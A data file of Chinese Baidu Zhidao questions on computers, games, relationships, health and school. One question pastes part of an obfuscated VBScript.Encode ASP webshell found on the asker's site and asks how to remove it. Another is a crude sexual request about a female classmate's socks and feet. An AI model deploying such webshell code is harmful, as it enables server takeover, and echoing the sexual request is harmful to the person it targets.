152966426.html		郴州哪里可以看薰衣草？	具体地方，大概什么时候去最好？
420326655.html	百度知道/生活/购房置业/	现在买房差最后一批款，但资金周转不来需贷款，无抵押物~无担保人。有什么办法么，资金缺口在8W左右。	工资收入不高，网上搜索的无抵押贷款条件达不到啊，本人重庆
157731286.html	百度知道/烦恼/恋爱/	30以上懂爱的人回答	我跟他相识3年，到了心有灵犀的地步，很多话不需要说，一个眼神就能明了。一次酒后乱性了。就此开始疏远他（因为他有家，我不可能做情人）\r\n我只要我们做朋友，事发都快一年了。没在见过。\r\n深夜的晚上，他会突然对我说，想去山里过世外桃园的生活，他做农夫，我做村姑。。。。。\r\n昨天我无聊找他聊天，跟他说美女，他却很不爽的说我不喜欢美女，美女累人，曾经我跟他说美女他都那么玩世不恭的说着各种美女我都喜欢，这种类型的，各种型号的。。。。。说的津津有味。很奇怪从他说喜欢我之后 就再也没再我面前说过别的女人。\r\n\r\n为什么会这样？？
415176711.html		我的是AOC液晶显示器，近段时间经常用着用着突然自动关闭，是显示器问题还是显卡问题呢？	我的是AOC液晶显示器，近段时间经常用着用着突然自动关闭，是显示器问题还是显卡问题呢？
56093140.html	百度知道/娱乐休闲/明星/	急想知道曹俊版本＜宝莲灯＞中的三圣母是谁演的？	宝莲灯
25029751.html	百度知道/游戏/网络游戏/	完美世界国际版更新不了?	我的完美世界国际版要更新了.他本身的游戏发布号是33. 为什么我去官网下的补丁都是低于33的呢. 怎么就没有33以上的呢???
42431937.html	百度知道/电脑/网络/笔记本电脑/其它笔记本/	Z99系列笔记本放音乐老死机是什么原因?	Z99HT56N笔记本放音乐老死机是什么原因?\r\n就算不死机也感觉很卡\r\n我机器升到1G内存 显卡是GF7000M\r\n谁能告诉我原因？
244550024.html		二手笔记本电脑报价	二手笔记本电脑报价，二手笔记本电脑价格大致多少呀\r\n我想买个个人转让的 北京朝阳区的最好
232308979.html	百度知道/社会民生/求职就业/	我是7月份就要毕业的大学生，现在实习，刚签了劳动合同，公司要给我办就业证，让我办暂住证，我该去哪里办	我住在南京雨花台东门，我想知道我现在可以办暂住证吗，该去哪里办呢?z周末可以去办吗？
159912137.html		用D-Link di524M无线连接PSP的问题	我买了个D-Link di524M无线路由器，也把路由等方面的设置弄好了，笔记本可以正常上网。但是有个奇怪的现象就是：每次关闭它后再打开，PSP就怎么也找不到网络，但是笔记本还是可以正常上网的。我就拔掉D-Link di524M的电源重插再接上，PSP才能寻找到网络上网，不知道这事怎么回事？怎么解决？（我还有台NDS，和笔记本一样只要路由启动都能找到网络；另外我拿了另外一台PSP试，也出现一样的问题，所以应该不是PSP有问题）
69817839.html		摩卡壶煮咖啡时听不到出水口发出”嘶~嘶~”的声音转	我用的是TIAMO的摩卡壶，使用方法如下：\r\n1、将磨好的咖啡粉放到粉槽内，下座加上刚煮好的热水，组合起来，拧紧\r\n2、用小火煮，听到嘶嘶声后开中火\r\n3、看到有咖啡液伴随着油脂沫流出后加大火量，然后关火\r\n刚买壶的时候经常喝，用起来都挺正常的\r\n后来不喝了，放了半年之后拿出来再用就出问题了\r\n小火加热时没有嘶嘶的声音，咖啡水就直接从出水口冒出来了，而且也没有油脂沫。\r\n我换了新的咖啡豆，把粉饼压得很紧还是不能解决问题\r\n请哪位高人帮帮忙～～～先谢谢啦
261921784.html	百度知道/生活/购车养车/汽车购买/	大家好，我想买辆自卸车给建筑工地运送沙土石子	请大家给我推荐一款质优价廉的车，价格在8-15万之间的，谢谢了
157492343.html	百度知道/电脑/网络/硬件/硬盘/	装win7系统后两块硬盘有一块硬盘不显示	以前是XP系统两块硬盘，一块500G，从盘250G，装上win7系统只显示了一块主盘500G的。原本以为250G硬盘坏了，但是在别的电脑上都可以使用。主硬盘为SATA接口，从盘为IDE接口。是不是因为两种不同接口造成的？但IDE接口也通着呢。等待答案，谢谢。
489986514.html	百度知道/游戏/腾讯游戏/轩辕传奇/	轩辕传奇战力怎么弄	我认识一朋友 他9件紫装 身上的所有装备没有一件上10 器灵紫的4级 蓝的5级\r\n\r\n我12件紫装 四件上10 器灵也是紫的四级 蓝的5级 装备强化没一件比他低的 按说我战力应该比他高太多了 结果只比他高一百多点 他技能修为比我高100 就是修炼比我点的多 但是多点有限 这是什么情况。。难道就是那100的修为和那一点修炼 赶上我那么多战力么？ 我们俩弑神一样 求大侠给解答下啊 他装备品质普遍比我低。
24071413.html	百度知道/电脑/网络/硬件/	最新内存行情	谁是搞内存的，我想问一下最近内存是涨还是跌，主要是现代内存怎么样啊！！！！！！
153985398.html	百度知道/商业/理财/个人理财/	淘宝申请实名认证点击之后出来一个对话框，时间很短就没了，是让你下载，谁知道这个是什么啊？	谁知道，告诉我一下，谢谢
55624051.html	百度知道/烦恼/夫妻/	我真的好烦,我该怎么办?	我在一个月前认识了他,朋友间的相处都很好,我慢慢喜欢上了他,而且他的出现也印证了我算命算出的一些东西.一次唱K,他的情绪很不好,偷偷告诉我他以前女朋友在他们都定好结婚日子的时候跟了别人,还做了对不起他的事请,他现在对女人都怕了,也怕谈恋爱,看到他那样,我心里很不是滋味,问他什么都不说了.又过了几天,我偶然问到他的八字,在他不知道的情况下,我给他算了命,结果很不好,今年是他的一个大坎,过了,一切都好,不过,他的人生就完了.这件事我到现在都没告诉他,没有机会,我也不知道怎么告诉他,因为我们之间什么关系都不是,我去给他算命算什么.就在昨天,对我来说简直就是晴天霹雳,晚上我找他,决定把算命的事告诉他,这些不好的东西宁可信其有,不可信齐无.可到我家接我的是个女的,我一下子就觉得不对了,在路上我问了他们的关系,她说她刚认识他没几天,到了吃饭的地方,我的直觉告诉我他们关系不对,我问了那女的,他们是不是在谈,她说:恩!我当场傻了,反过来要他介绍介绍这是谁,他只是笑,走到那女人身后,在她肩上抱抱,说:这还要介绍什么,我们比较含蓄的!饭我是吃不下了,找了借口先走了,我真的不明白这到底是怎么一回事,办个月前泪汪汪跟我说,我真的怕了,不想谈的人,突然间对一个女人这么好,这女人一点不漂亮,在房产公司,有车,有钱,他在银行,条件也不错,真不知道他们之间是什么关系.我这一个月来对他,傻子也能明白什么意思,可他为什么这样呢?算命的算出的不好的东西,他一条条在往上面靠拢,我当时听了就怕,天天在为他担心着,可我换来的却是......\r\n我去问过算命的,他只要谈比我大的,比他自己小的或者一样的,他的最后结果都是离婚,我有种想偷笑的感觉.现在到这个地步,我很矛盾,一方面觉得都这样了,就算了吧,大家还是朋友,能聚聚就聚聚,不能就这样不了了知;另一方面,我不知道要不要把我这一个月来为他担心的,为他做的,帮他算命的东西告诉他,告诉他,我不知道怎么开口,怎么约他说,不告诉,我良心上过不去,万一哪天,他出了事,因为我知道而没告诉他,又该怎么办?我最怕的是,他在做贷款单子的时候,一定要当心又当心,不然就是一个大的官司在身上,这样他的前途全毁了!\r\n求求好心人告诉我,我该怎么办?
38402945.html	百度知道/娱乐休闲/电影/	有谁知道\"狂野时速\"里美女主角唱的那首歌的歌名叫什么?一首很动听的赛车曲子..........(不是东京飘移)	女主角名字叫Nadia Bjorlin,是位歌手和演员
5250025.html	百度知道/电脑/网络/互联网/网站使用/	\"旁注 - 网站小助手\"这个木马怎么防范和杀除?	在站点下的根目录里多了好几个ASP类型文件，下到本地一看,名字都是以前没见过而且加密的： \r\n<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%> \r\n<html> \r\n<head> \r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"> \r\n<title>旁注 - 网站小助手</title> \r\n<style type=\"text/css\"> \r\n<!-- \r\n.black { \r\nfont-family: \"宋体\"; \r\nfont-size: 12px; \r\ncolor: #000000; \r\ntext-decoration: none; \r\nline-height: 120%;} \r\n--> \r\n</style> \r\n<style type=\"text/css\"> \r\n<!-- \r\na:link { \r\nfont-family: \"宋体\"; \r\nfont-size: 12px; \r\ncolor: #00CC00; \r\ntext-decoration: none; \r\n} \r\na:visited { \r\nfont-family: \"宋体\"; \r\nfont-size: 12px; \r\ncolor: #00CC00; \r\ntext-decoration: none; \r\n} \r\na:hover { \r\nfont-family: \"宋体\"; \r\nfont-size: 12px; \r\ncolor: #333333; \r\ntext-decoration: none; \r\n} \r\n--> \r\n</style> \r\n</head> \r\n<body bgcolor=\"#000000\" leftmargin=\"0\" topmargin=\"0\" marginwidth=\"0\" marginheight=\"0\"> \r\n<p> \r\n<%#@~^DAAAAA==~9kh,W(LsUr,vQMAAA==^#~@%> \r\n<%#@~^CwAAAA==~9kh,09lYmPmgMAAA==^#~@%> \r\n<%#@~^EgAAAA==~9kh,W(LZKE OsbVnPXgYAAA==^#~@%> \r\n<%#@~^FgAAAA==~Kx~DMWD,DdEs+~x6O~9wcAAA==^#~@%> \r\n<%#@~^QAAAAA==~U+O,W(LsUr,xPU+.\\D /M+lDnr(L+1OcJUmMk2YrUTRok^n?H/Onsr4%n1YE#,ThYAAA==^#~@%> \r\n<%#@~^KQAAAA==~b0~:Db:`M+$;+kYcJkXW[alY4E#*@!@*rE~Y4+ PqgwAAA==^#~@%> \r\n<%#@~^HQAAAA==~6NCDl,'PM+$;+kYcJ1XW[9lYmE#,mwkAAA==^#~@%> \r\n<%#@~^QgAAAA==~U+O,W(LZKE OsbVn'K4%oUrR;.+mY+:naYwk^+cDn5!+dYvE/H0[2mYtEbBK.Eb,dRcAAA==^#~@%> \r\n<%#@~^GgAAAA==~K4%;W!xYwk^nRqDrYPW[mYl,XQkAAA==^#~@%> \r\n<%#@~^EAAAAA==~b0~DMP'ZPD4+ P1AQAAA==^#~@%> \r\n<%#@~^NwAAAA==~M+daW /+chMrYPE@!6WUO,mW^GD{aswoo!Z@*保存成功e@!&0GUD@*EPNQ8AAA==^#~@%> \r\n<%#@~^BgAAAA==~VdP6QEAAA==^#~@%> \r\n<%#@~^NwAAAA==~M+daW /+chMrYPE@!6WUO,mW^GD{aswoo!Z@*保存失败e@!&0GUD@*EPNQ8AAA==^#~@%> \r\n<%#@~^CAAAAA==~x[,k6PZgIAAA==^#~@%> \r\n<%#@~^CwAAAA==~D.cm^+lMPvgMAAA==^#~@%> \r\n<%#@~^CAAAAA==~x[,k6PZgIAAA==^#~@%> \r\n<%#@~^FAAAAA==~K4%;W!xYwk^nR;VG/PKAcAAA==^#~@%> \r\n<%#@~^GgAAAA==~U+O,W(LZKE OsbVn'gWO4bxo,ZAkAAA==^#~@%> \r\n<%#@~^FgAAAA==~U+O,W(LsUr,xPgWOtbxL~AwcAAA==^#~@%> \r\n<%#@~^HAAAAA==~\"+daW /+chMrYPE@!J0G.s@*J,qQgAAA==^#~@%> \r\n(未完)\r\n我看这个是ASP木马产生，请问各位高手该如何应对？？
81004859.html	百度知道/电脑/网络/	玩具总动员1(反斗奇兵1)粤语主题曲	玩具总动员1(反斗奇兵1)粤语电影刚开始唱的那首歌叫什么呢? 歌词有一句是:做个玩偶也极有意义
57301573.html	百度知道/教育/科学/院校信息/	大学的专业怎样分类的?	请问所有大学的本科专业是怎样分类的?\r\n我是高三刚毕业的学生,我想了解一下有关大学专业比较基础的知识,谢谢
61960948.html	百度知道/教育/科学/人文学科/语言学/	求有关团结合作的成语	不少于10个!!\r\n如:万众一心,众志成城这类成语.\r\n要求:必须是四字成语或七字成语,六字,五字也行.\r\n越快越好,越多越好,快!!!\r\n众人拾柴火焰高这类的也行.\r\n急需!!
447935562.html	百度知道/生活/家居装修/	哪一种木头更好一些？	请问：紫檀、沉香、海皇（头一次听说这种木，不知道怎么打）、黄花梨（好像也错了）哪一种最好？
358254100.html		宏基笔记本	本人的笔记本I5 2430的核心显卡是HD3000还是HD2000，还是其他的显卡呢
5179394.html	百度知道/社会民生/求职就业/	要在几天之内离职，说点什么理由老板会同意？急！！	是做出纳的，大家帮下忙，多谢
64943640.html	百度知道/烦恼/	找女友问题	我现在有一个一般的女友,我马上上大学了,是不是应该找一个和自己学同样的专业的,现在太早了,大家都说说看,有道理就有分.
354894416.html	百度知道/生活/购车养车/汽车购买/	福特嘉年华1.3L手动的配置	意向车型：福特 嘉年华两厢\r\n比对方面：动力,操控度,安全,质量\r\n
70337997.html	百度知道/娱乐休闲/电影/	咨询一部欧美恐怖片	影片开头是几个人从野外抬回一只猴子，之后一个老太太到公园看猴子，被猴子抓伤手臂，睡了一觉以后，脸上开始掉皮，之后记不清了，9几年的片子，比较老了，各位大大知道这部片子叫什么名字吗？
60025251.html	百度知道/游戏/网易游戏/魔兽世界/	让治疗职业OT的MT不是一个好的MT	大家同意这句话吗~~~为什么?
58560837.html	百度知道/教育/科学/外语学习/日语/	モーマンタイ的意思？	有哪位达人知道モーマンタイ的意思，告诉一下小女子，谢谢各位哥哥了。
530613271.html		有木有人知道关于陈婆渡的历史传记？	比如像宋朝时期陈婆渡的一些故事或历史？
516452542.html	百度知道/烦恼/恋爱/	如何选择令一半，相亲怎么看待?	今年29岁，男，稳定工作，通过同事介绍一个28岁的女孩，家庭条件自身都还可以，单位是企业，是做保险的，怎么说呢，为人应该还算本分，给我的感觉没有特殊喜欢的，如果谈到结婚，如果是和她，感觉动力不是特别大，认识刚一个月，现在放弃了，感觉会不会错过，不放弃，动力又不是特别大？我该如何面对这件事，还有，我家庭条件不好，自身素质条件还可以，像这种情况，选择另一半该如何选择呢，是还算可以就可以了，还是不要在挑剔了？谢谢！
65371232.html		现在手机漫游和长途价格是多少？还有在外地用手机收漫游月租吗？假如我在外地打一个长途要多少钱每分钟！	大家帮帮兄弟
78232469.html	百度知道/教育/科学/理工学科/数学/	一个人的出身年份加5能被9整除、加6能被10整除、加7能被11整除、加8能被12整除,求这个人的出身年份	要求解过程
67825011.html	百度知道/烦恼/	如何锻炼交际能力，广州市有没有这方面的学校。	如何提高自己跟别人的交际能力呢？其实我有时候知道，但是我就是不想说，我比较内向！
82689131.html	百度知道/游戏/网易游戏/魔兽世界/	魔兽世界如何在角色名字前面获得头衔？	我经常看见那些人在zc里有头衔，但是我发现自己却没有，例如什么步兵之类的，还有些非常复杂。\r\n请问如何获得这些头衔？
5953681.html		《陀枪师姐2》的结局	《陀枪师姐2》的结局感觉不是很令人明白。与第三部开头衔接得不太好。\r\n最后娥姐为何没有和小生在一起？而且最后也没有交代他们的结果。而第三部开头也没有说明，直接说了娥姐和一个外国医生结婚了。并没有解释。这两部的上下承接很有问题。
88772451.html		九年级化学，检验食盐中是否含亚硝酸钠的过程	九年级化学，检验食盐中是否含亚硝酸钠的过程
250389914.html	百度知道/烦恼/家庭关系/	我跟我表弟吵架了，我表弟读小学，我读中学我是男的，他以前没有交朋友的时候经常来找我玩。	我觉得这一生中就有他这个好朋友了，我跟他出去我很开心，他还说读了高中就没的玩了，要和我出去好好玩，就像多啦a梦的大雄一样。我老师帮助他，请他，他现在交朋友了，终于说了真的，说我老是叫他出去，我很烦，以后不想认识我，我听了超生气，我就去把他给弄哭了，他说要还我钱。我回到家其实还是很伤心的，我以前对他的好，他现在反过来就跟我说不跟我在一起出去玩了，他有同学了，可以去同学家里了，就不来找我了。我该怎么办？我有点想欺负他，又想跟他合好。以后不能在一起了，我有生气又伤心。
378701751.html	百度知道/游戏/单机游戏/魔兽争霸/	火影忍者羁绊3.1B	羁绊3.1B三代怎么用额.玩的中娱.2个人.看人家通关属性都是W以上的.我才8000多.请教下他的详细攻略.还有就是该不该修仙人套的.也可以加Q471932948 可加分..
821146.html		周笔畅签的是哪个大公司	他为什吗没有大公司签呢！～？？人家比李雨春有前途多了！！
61808141.html		我想问我班女生袜子	我特别想问 穿在她脚上 雪白的 让我添几下也行 或者不洗脚我来添 \r\n我和我同桌 说好几次了 都不行 亲嘴 行 就是不 能添她脚 问袜子 也不行 怎么能问到
51626960.html	百度知道/烦恼/恋爱/	我的男朋友跟她女朋友才分手,他们在一个单位上班!每天都会见面,我好怕他们又会从燃爱火?	我的男朋友跟她女朋友才分手,他们在一个单位上班!每天都会见面,我好怕他们又会从燃爱火!我的担心是多余的吗?他们曾经在一起5年了,现在他们天天见面,有时候还要交流要工作方面的事!我男朋友又是那女的上司..... 不是我不相信我男朋友!只是现实是很残酷的!我也得每天都面对他们.那女的也是我的上司!唉______
23796110.html	百度知道/教育/科学/学习帮助/	在铁丝在氧气中燃烧的全过程中，请回答下列问题	1.选用的铁丝应用________进行处理。\r\n2.点燃火柴后，铁丝插入集气瓶中适宜时刻和方法:_______________________.
45441549.html	百度知道/地区/甘肃/兰州市/	笔记本哪里买	在兰州哪里买笔记本不易被骗,价格也合试
231938997.html	百度知道/游戏/腾讯游戏/地下城与勇士/	求DNF力法PK和刷图加点各一套 与这2套加点的刷图装备 最好详细点 本人第一次玩力法。求高手赐教	最好把矛与棍的区别说哈子，可不可一穿布甲与皮甲的混搭 复制的就别来了
261517015.html	百度知道/电子数码/手机/通讯/	5802刷5800！！！	请问我的心机5802\r\nTYPE:RM-427\r\n软件版本：v30.0.011.5\r\n11-05-10\r\n定制版本：30.0.011.5.308.03\r\n24-06-2010 \r\n\r\n\r\n那还可以刷成\r\n5800\r\nrm-427\r\nv30.0.11.1 固件吗？\r\n会的大大可以教教我不？
246119794.html	百度知道/教育/科学/	厦门理工学院能上吗？	我快高考了，成绩不怎么理想，模拟考试一般都在一本左右，想去理工学院读车辆工程，想了解这个专业招分情况（我江西的，车辆只招两名），分会补上的。
22149842.html	百度知道/医疗健康/皮肤科/	宝宝经常长湿疹（俗称奶藓）该怎么办？	宝宝现在70多天，从20多天开始经常长湿疹。涂上药好了后又开始长。\r\n有什么好的方法没？用了好多药都不管用。现在医生给开了氟轻松。但这是激素类药物，经常用不好。医生说厉害时用点没关系。我不知该怎么办？
24388957.html	百度知道/医疗健康/	总爱放屁这几天，而且小腹左下有隐痛	不知道是不是有什么毛病啊？？大便发黑，不硬不干！挺软的~~\r\n而且总是感觉小腹左边疼痛！这是怎么回事啊？？谢谢大家了！！！
435859836.html		魔兽争霸地图编辑器，如何更改英雄说话音效?	您好\r\n\r\n请问在魔兽争霸III的地图编辑器里面\r\n\r\n如何更换调英雄说话的音效呢？\r\n\r\n我想把英雄说话的音效更改成自己的录音\r\n\r\n可以做到吗？\r\n\r\n如何做?\r\n\r\n谢谢!
208706408.html	百度知道/商业/理财/	有人知道天狮新开的泰济生健康管理中心吗？	天狮新开了个泰济生健康管理中心，环境挺好，就是不知道以后的发展前景怎么样，因为针对的都是高端客户，而且在开发区的最里面，就怕没有多少人去以后发展不好，请问有人了解吗？
238035488.html		国税局自动办税终端增值税发票验旧流程？	一次验旧的发票，有报完税的，有没报税的？怎么验旧？没报税部分在自动机上怎么弄？谢谢！
456195714.html	百度知道/游戏/网络游戏/	TNT里的武器过期了，装在上面的泰坦芯片会消失么？	武器要过期时不管他，泰坦芯片是去拆下来还是自动下来？
210864950.html	百度知道/娱乐休闲/动漫/	看谁猜得对	我喜欢哪个歌星？认真回答
227044665.html	百度知道/教育/科学/职业教育/职业培训/	我是上着高二的美术生，未来想学设计类的专业，但是不想考美院，可以请教下、将来能选择二本类大学有哪些	如题。现在我的美术专业学的一般，但是我会努力赶上去的，现在的文化成绩大概保持在450分。。。\r\n\r\n未来想学设计，特别是动漫设计。。
243880087.html		我是一名中专生，明年6月份左右毕业，今年7月份左右实习，我不参加实习去报名复读班能报名明年的高考吗？	我是一名中专生，在太原卫校上学。今年7月份左右实习，明年的6月份左右应该就毕业了。我不想参加今年7月份的实习，想去报名高考复读班，然后参加明年的高校普通高考。可以吗？如果可以，中专毕业证7月份左右才发。高考报名条件中说需要高级中等教育学校毕业证书或同等学力证明，也就是说我让我所在的太原卫校开个证明就可以了是吗？报名条件中还说凡具有高等学历教育资格的高等学校在校生都不可以报名。那我今年年底去教育局报名参加明年的高考，算是在校生还是应届生？
439011372.html	百度知道/娱乐休闲/宠物/	狗狗发烧拉稀怎么回事？	刚去医院打完针。血常规没什么问题。医生就说发烧了。狗瘟热就是发烧拉稀……到底怎么回事啊？
234657101.html	百度知道/娱乐休闲/动漫/	哪位大大有犬夜叉同人小说啊…请发到497000589@qq.com	要BG啊
43824187.html		为什么是 百家争鸣?	只要儒道墨法兵5家 为什么教百家zhengming?
65126867.html	百度知道/教育/科学/院校信息/	8月20日冲金点以及热门赛事都有什么?	8月20日冲金点以及热门赛事都有什么?
74775315.html	百度知道/商业/理财/保险/	事故责任免赔率	我一个朋友在2006年与人发生了一起交通事故，双方是同等责任，对方的损失是14万多元，因为我朋友是机动车，对方是自行车，所以我朋友按70%赔付给了对方（10万多元），我朋友投有10万元的第三者责任险，现在保险公司应赔付给我朋友多少钱？谢谢，急用
77341870.html	百度知道/教育/科学/院校信息/	浙江大学VS对外经贸大学 外语系哪个好？	我是外国语学校的保送生~\r\n好像去哪个学校都要选外语系\r\n所以，请帮忙分析一下这两个学校哪一个外语系比较好。。。\r\n最好具体一点，从什么师资，环境，就业等一系列问题上帮忙进行一下分析！\r\n谢谢！！
428920748.html		我是不是怀孕了，求专业人士	男没插入只是摩擦然后射在了阴部已经3天了下面出来透明分泌物带有血丝我是不是怀孕了求专业人士解答
156346739.html	百度知道/教育/科学/职业教育/	郑州市二十四中，文化课好不好？	详细点
56719500.html		小女子求助！毕业论文摘要翻译(人工翻译)不要用翻译软件	本课题利用高级语言设计流程图系统中常用的图形元素的编辑，提供在工程中使用这些图形构成流程图的基本方法，以对象类供应用程序使用。\r\n流程图是流经一个系统的信息流、观点流或部件流的图形代表。在企业中，流程图主要用来说明某一过程。这种过程既可以是生产线上的工艺流程，也可以是完成一项任务必需的管理过程。\r\n本论文是在对图形的存储、绘制等知识的学习的基础上，运用MFC等技术，使用Visual C++ 6.0编制而成的。在本绘图应用程序中，实现了一般绘图应用程序所具有的主要功能并提供一些额外的辅助功能。根据应用程序所实现的功能，本程序可以被划分以下模块：基本图元绘制、图形修改、图元修改、辅助功能和图形文件存取等。划分这些模块的规则主要是根据功能之间的联系。类似流程功能就被划分为一个模块。\r\n\r\n最终通过反复调试，实现以下功能与作用\r\n1、 绘制图元\r\n2、 图形修改与编辑\r\n3、 图元修改与编辑\r\n\r\n关键字：计算机图形 矢量图形 图形编辑 图元
215837430.html		求几个动漫桌面精灵~好玩 凉宫春日，初音有了，好心人～～～	没分局没人回答吗？有好心人吗？我是新手～～没钱55
14847556.html	百度知道/电脑/网络/操作系统/系统故障/Windows/	桌面图标突然变的像安全模式下那么大,而且也很模糊,请问这是怎么回事??????????	正从游戏中出来,结果发现桌面图标变得很大,就跟安全模式一样大,请问怎么回事,重启之后好像也不管用,能告诉我是怎么回事吗?
421253234.html	百度知道/教育/科学/理工学科/数学/	历史上比较著名的女数学家有哪些	女数学家
53506239.html	百度知道/电脑/网络/操作系统/系统故障/Windows/	我的手机往电脑插数据线后说要安装新硬件````点了下一步以后却说找不到硬件无法安装````是怎么回事??	同题
178135630.html	百度知道/生活/美容/塑身/	退钱后咳嗽未痊愈.脸颊太阳穴左右都长了痘痘	这样正常吗？脸颊上有时长出了硬硬的小痘.皮肤爱出油.我可以用THE BOBY SHOP的茶树精油吗？
43560784.html	百度知道/教育/科学/外语学习/英语考试/	you should remember toleration and forgiveness 这句话有什么不对啊？高手回答一下。谢谢！	这是我作文里的一个句子，老师说toleration 用得不对，可是我查了半天，也没看出来，有高手能帮忙解决一下把！
247477585.html	百度知道/游戏/网易游戏/魔兽世界/	魔兽icc死骑的gs多少可以t	gs多少可以当10人声望队t？多少可以t普通10人，多少可以t10英雄的？多少可以t25的？多少可以t25英雄的？自己开团或组别人团gs的要求不同吗？我是dkt
165178667.html	百度知道/游戏/完美游戏/诛仙/	教我诛仙2 摆摊的方法	教教我怎样去 摆摊？我都不知道怎么样自己 摆摊？》高手教教我要点那个地方 摆摊
490756403.html	百度知道/娱乐休闲/花鸟鱼虫/	我的小乌龟生病了，龟的头部常伸出体外，而且是向伸得老高……	龟的头部常伸出体外，而且是向伸得老高，鼻孔冒白色透明液体，口腔下有黄色黏稠状腋体，不食，饮水较少且不爬动。有时候整个伸长的头部就趴在缸上。
156200667.html	百度知道/娱乐休闲/宠物/	狗瘟去医院治要多少钱	我家的小狗，得了狗瘟，一开始发烧，然后不吃食，现在眼睛基本睁不开了，我家不是很有钱，好心人知道怎么治疗吗，帮帮我的忙吧，我在这里求你们了\r\n谢谢！！
248215103.html	百度知道/电脑/网络/常见软件/图像处理软件/	CAD倒圆怎么画	CAD倒圆怎么画
54866993.html	百度知道/教育/科学/升学入学/	月亮是什么颜色	月亮的颜色是什么样子的啊 帮个帮把
74711781.html		摩尔庄园为什么只能赚一万摩尔豆	摩尔庄园为什么只允许我赚10000摩尔豆啊？好少哦！我没半小时就10000了
153574135.html		苏宁售后主管待遇和前途怎么样？	是苏宁的分公司
434578325.html	百度知道/地区/广东/	我是广东的老公是河南周口鹿邑的，我的户口还在广东，我们有出生证明，结婚证，户口本，双方身份证。	还有广东当地派出所的证明，当到河南当地入户处入户是他却说办不了，犯法，想问这是什么说法，或是有能什么解决的好方法，请专业人士帮忙解答，最好是河南法制的，
59944144.html	百度知道/教育/科学/人文学科/哲学/	6这个数字好，还是8好	如题。
24966930.html		拽的意思	拽噶意思系咩吖？唔该喇，，，帮下忙？？．．．．
250600280.html	百度知道/电脑/网络/硬件/硬盘/	有什么478主板支持ATA接口硬盘	我有1老电脑 845主板2.4CPU 1G内存 平常做下载器用 今天拿来玩了下网游 发现双开一卡一卡的 想升级下电脑 打开机箱才发现硬盘和主板的接口没见过 网上一查才知道是IDE接口 这电脑真是古老啊 前几天才买的新电脑都用上SATA了 我有一个80GATA接口的硬盘\r\n1支持478CPU的\r\n2支持DDR1G内存的\r\n3支持SATA接口\r\n有这样的主板吗？
155701216.html	百度知道/医疗健康/	脚受伤喝什么汤好	脚受伤喝什么汤好
396403384.html	百度知道/娱乐休闲/花鸟鱼虫/	请问有没有谁知道这种小虫子叫什么名字，谢谢。	http://hi.baidu.com/%C3%CE%D6%D0%B5%C4%C2%F3%CC%EF/album/item/d7636efbfbedab645df58779f736afc378311e74.html#
57730316.html	百度知道/教育/科学/人文学科/传播学/	共建生是什么？	说详细点......\r\n我是08年湖北毕业生。
149926248.html	百度知道/电脑/网络/电脑装机/选购/	各位大虾帮忙看看这样的配置合理没？	本人菜鸟，请朋友帮配的主机，挺看中那个CPU的，大虾们帮忙看看这样配合理没，需要什么改进？本人现在还没玩什么大型3D网游，所以显卡先不用了。\r\n\r\n配件 数量 单价 品牌型号 \r\nCPU 1 545 AMD Athlon II X3 435/盒装 \r\n主板 1 499 捷波 悍马HZ02 \r\n内存 1 345 威刚 万紫千红DDR3 1333 2G \r\n硬盘 1 330 希捷 500G SATA2 16M(7200.12/ST3500410AS) \r\n刻录机 1 125 三星 TS-H353C/CHXH(SATA) \r\n键鼠套装 1 99 双飞燕 KL-2350D防水飞燕光电套装 \r\n机箱 1 186 先马 冰麒麟X8\r\n电源 1 228 航嘉 冷静王钻石2.3版本\r\n价格总计:2357元
160739532.html	百度知道/商业/理财/贸易/	如何设置淘宝店搜索时的运费显示快递运费而不是平邮	我平邮设置得运费很高，搜索时显示是平邮的运费，几十块，难怪没人来我的店。如果设置成快递的10块钱啊？
180718079.html	百度知道/电脑/网络/常见软件/安全软件/	提款机怎么汇钱?	提款机怎么汇钱?
158294547.html	百度知道/社会民生/其他社会话题/	健尔马足疗机的第一代与第二代有什么不同?	有红色的吗？？
414854439.html	百度知道/文化/艺术/文学/小说/	跪求猫音的小说《 妖恋·凤箫吟》txt全本加番外，《绯桃依依》完结的txt，发到ha5643@qq.com	还有其他该作者的作品也一起发给我吧，我会马上采纳并给分的！拜托了！
